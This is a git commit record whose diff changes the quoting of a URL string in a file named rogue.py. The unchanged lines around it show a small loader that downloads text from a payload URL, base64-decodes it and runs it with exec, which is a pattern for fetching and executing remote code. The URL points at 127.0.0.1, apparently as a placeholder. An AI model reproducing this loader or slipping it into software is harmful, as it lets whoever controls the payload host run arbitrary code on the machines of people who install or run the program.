81a307c33845b11df6d8db007b3fb5fac3442ea9
Corvo <rodrigo-f-p@hotmail.com>
2023-03-12 22:26:46 -0300

    Update rogue.py

--- rogue.py
+++ rogue.py
@@ -1,6 +1,6 @@
 from base64 import b64decode
 from requests import get
 #-----#
-source = "https://127.0.0.1/payload"
+source = 'https://127.0.0.1/payload'
 exec(b64decode(get(source).text[2:-2]))
 #-----#
